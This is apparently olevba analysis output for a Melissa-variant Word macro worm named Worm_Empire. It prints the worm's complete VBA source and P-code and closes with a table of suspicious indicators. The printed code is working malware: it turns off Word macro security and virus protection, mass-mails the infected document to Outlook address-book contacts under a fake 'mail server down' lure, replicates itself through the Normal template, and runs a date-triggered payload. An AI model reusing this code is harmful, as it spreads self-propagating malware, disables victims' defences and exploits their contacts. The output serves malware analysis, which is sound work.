olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Melissa.ap
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Worm_Empire.cls 
in file: Virus.MSWord.Melissa.ap - OLE stream: 'Macros/VBA/Worm_Empire'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
    CommandBars("Macro").Controls("Security...").Enabled = False: System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
    CommandBars("Tools").Controls("Macro").Enabled = False: Options.ConfirmConversions = False: Options.SaveNormalPrompt = False: Options.VirusProtection = False
End If
Dim OLook, APIName, ABook, Off, Y As Integer, X As Integer, Z As Integer
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Security", "ActiveWorm") <> "Worm Empire" Then
    Set OLook = CreateObject("Outlook.Application"): Set APIName = OLook.GetNameSpace("MAPI")
    If OLook = "Outlook" Then
        APIName.Logon "profile", "password"
        For X = 1 To APIName.AddressLists.Count
            Set ABook = APIName.AddressLists(X): Set Off = OLook.CreateItem(0)
            For Y = 1 To ABook.AddressEntries.Count
                Off.Recipients.Add ABook.AddressEntries(Y): If Y > 50 Then Exit For
            Next Y
            Off.Subject = "Extremely URGENT: To All E-Mail User - " & Date
            Off.Body = "This announcement is for all E-MAIL user. Please take note that our E-Mail Server will down and we recommended you to read the document which attached with this E-Mail."
            Off.Attachments.Add ActiveDocument.FullName: Off.Send
        Next X
        APIName.Logoff
    End If
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Security", "ActiveWorm") = "Worm Empire"
End If
Dim AT, NT, AL As Long, NL As Long, CL As Long
Set AT = ActiveDocument.VBProject.VBComponents.Item(1): Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
AL = AT.CodeModule.CountOfLines: NL = NT.CodeModule.CountOfLines
If NT.Name <> "Worm_Empire" Then
    If NL > 0 Then NT.CodeModule.DeleteLines 1, NL
    NT.CodeModule.AddFromString "Private Sub Document_Close()"
    For CL = 2 To AL
        NT.CodeModule.InsertLines CL, AT.CodeModule.Lines(CL, 1)
    Next CL
    NT.Name = "Worm_Empire"
    If ActiveDocument.ReadOnly = False Then
        ActiveDocument.SaveAs ActiveDocument.FullName
    Else
        ActiveDocument.Saved = True
    End If
End If
If AT.Name <> "Worm_Empire" Then
    If AL > 0 Then AT.CodeModule.DeleteLines 1, AL
    AT.CodeModule.AddFromString "Private Sub Document_Open()"
    For CL = 2 To NL
        AT.CodeModule.InsertLines CL, NT.CodeModule.Lines(CL, 1)
    Next CL
    AT.Name = "Worm_Empire"
    If ActiveDocument.ReadOnly = False Then
        ActiveDocument.SaveAs ActiveDocument.FullName
    Else
        ActiveDocument.Saved = True
    End If
End If
If Day(Date) = 10 And Hour(Time) = 10 Then
    For CL = 1 To 5
        ActiveDocument.SaveAs Day(Date) & Month(Date) & Year(Date) & Second(Time) & CL
    Next CL
    With Selection
        .GoTo wdGoToLine, wdGoToAbsolute, 1
        .Font.Size = 40
        .Font.Underline = wdUnderlineWords
        .Font.Italic = True
        .TypeText "Worm! Let's We Enjoy." & Chr(10)
    End With
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Melissa.ap
' ===============================================================================
' Module streams:
' Macros/VBA/Worm_Empire - 10152 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #3:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #4:
' 	ElseBlock 
' Line #5:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #6:
' 	EndIfBlock 
' Line #7:
' 	Dim 
' 	VarDefn OLook
' 	VarDefn APIName
' 	VarDefn ABook
' 	VarDefn Off
' 	VarDefn Y (As Integer)
' 	VarDefn X (As Integer)
' 	VarDefn Z (As Integer)
' Line #8:
' 	LitStr 0x0000 ""
' 	LitStr 0x001B "HKEY_LOCAL_MACHINE\Security"
' 	LitStr 0x000A "ActiveWorm"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x000B "Worm Empire"
' 	Ne 
' 	IfBlock 
' Line #9:
' 	SetStmt 
' 	LitStr 0x0013 "Outlook.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set OLook 
' 	BoS 0x0000 
' 	SetStmt 
' 	LitStr 0x0004 "MAPI"
' 	Ld OLook 
' 	ArgsMemLd GetNameSpace 0x0001 
' 	Set APIName 
' Line #10:
' 	Ld OLook 
' 	LitStr 0x0007 "Outlook"
' 	Eq 
' 	IfBlock 
' Line #11:
' 	LitStr 0x0007 "profile"
' 	LitStr 0x0008 "password"
' 	Ld APIName 
' 	ArgsMemCall Logon 0x0002 
' Line #12:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld APIName 
' 	MemLd AddressLists 
' 	MemLd Count 
' 	For 
' Line #13:
' 	SetStmt 
' 	Ld X 
' 	Ld APIName 
' 	ArgsMemLd AddressLists 0x0001 
' 	Set ABook 
' 	BoS 0x0000 
' 	SetStmt 
' 	LitDI2 0x0000 
' 	Ld OLook 
' 	ArgsMemLd CreateItem 0x0001 
' 	Set Off 
' Line #14:
' 	StartForVariable 
' 	Ld Y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ABook 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	For 
' Line #15:
' 	Ld Y 
' 	Ld ABook 
' 	ArgsMemLd AddressEntries 0x0001 
' 	Ld Off 
' 	MemLd Recipients 
' 	ArgsMemCall Add 0x0001 
' 	BoS 0x0000 
' 	Ld Y 
' 	LitDI2 0x0032 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #16:
' 	StartForVariable 
' 	Ld Y 
' 	EndForVariable 
' 	NextVar 
' Line #17:
' 	LitStr 0x0027 "Extremely URGENT: To All E-Mail User - "
' 	Ld Date 
' 	Concat 
' 	Ld Off 
' 	MemSt Subject 
' Line #18:
' 	LitStr 0x00A8 "This announcement is for all E-MAIL user. Please take note that our E-Mail Server will down and we recommended you to read the document which attached with this E-Mail."
' 	Ld Off 
' 	MemSt Body 
' Line #19:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld Off 
' 	MemLd Attachments 
' 	ArgsMemCall Add 0x0001 
' 	BoS 0x0000 
' 	Ld Off 
' 	ArgsMemCall Send 0x0000 
' Line #20:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' Line #21:
' 	Ld APIName 
' 	ArgsMemCall Logoff 0x0000 
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	LitStr 0x000B "Worm Empire"
' 	LitStr 0x0000 ""
' 	LitStr 0x001B "HKEY_LOCAL_MACHINE\Security"
' 	LitStr 0x000A "ActiveWorm"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	Dim 
' 	VarDefn AT
' 	VarDefn NT
' 	VarDefn AL (As Long)
' 	VarDefn NL (As Long)
' 	VarDefn CL (As Long)
' Line #26:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set AT 
' 	BoS 0x0000 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NT 
' Line #27:
' 	Ld AT 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St AL 
' 	BoS 0x0000 
' 	Ld NT 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St NL 
' Line #28:
' 	Ld NT 
' 	MemLd New 
' 	LitStr 0x000B "Worm_Empire"
' 	Ne 
' 	IfBlock 
' Line #29:
' 	Ld NL 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld NL 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #30:
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #31:
' 	StartForVariable 
' 	Ld CL 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld AL 
' 	For 
' Line #32:
' 	Ld CL 
' 	Ld CL 
' 	LitDI2 0x0001 
' 	Ld AT 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #33:
' 	StartForVariable 
' 	Ld CL 
' 	EndForVariable 
' 	NextVar 
' Line #34:
' 	LitStr 0x000B "Worm_Empire"
' 	Ld NT 
' 	MemSt New 
' Line #35:
' 	Ld ActiveDocument 
' 	MemLd ReadOnly 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #36:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #37:
' 	ElseBlock 
' Line #38:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	Ld AT 
' 	MemLd New 
' 	LitStr 0x000B "Worm_Empire"
' 	Ne 
' 	IfBlock 
' Line #42:
' 	Ld AL 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld AL 
' 	Ld AT 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #43:
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Ld AT 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #44:
' 	StartForVariable 
' 	Ld CL 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld NL 
' 	For 
' Line #45:
' 	Ld CL 
' 	Ld CL 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld AT 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #46:
' 	StartForVariable 
' 	Ld CL 
' 	EndForVariable 
' 	NextVar 
' Line #47:
' 	LitStr 0x000B "Worm_Empire"
' 	Ld AT 
' 	MemSt New 
' Line #48:
' 	Ld ActiveDocument 
' 	MemLd ReadOnly 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #49:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #50:
' 	ElseBlock 
' Line #51:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	EndIfBlock 
' Line #54:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000A 
' 	Eq 
' 	Ld Time 
' 	ArgsLd Hour 0x0001 
' 	LitDI2 0x000A 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #55:
' 	StartForVariable 
' 	Ld CL 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0005 
' 	For 
' Line #56:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	Concat 
' 	Ld Date 
' 	ArgsLd Year 0x0001 
' 	Concat 
' 	Ld Time 
' 	ArgsLd Second 0x0001 
' 	Concat 
' 	Ld CL 
' 	Concat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #57:
' 	StartForVariable 
' 	Ld CL 
' 	EndForVariable 
' 	NextVar 
' Line #58:
' 	StartWithExpr 
' 	Ld Selection 
' 	With 
' Line #59:
' 	Ld wdGoToLine 
' 	Ld wdGoToAbsolute 
' 	LitDI2 0x0001 
' 	ArgsMemCallWith If 0x0003 
' Line #60:
' 	LitDI2 0x0028 
' 	MemLdWith Font 
' 	MemSt Size 
' Line #61:
' 	Ld wdUnderlineWords 
' 	MemLdWith Font 
' 	MemSt Underline 
' Line #62:
' 	LitVarSpecial (True)
' 	MemLdWith Font 
' 	MemSt Italic 
' Line #63:
' 	LitStr 0x0015 "Worm! Let's We Enjoy."
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #64:
' 	EndWith 
' Line #65:
' 	EndIfBlock 
' Line #66:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

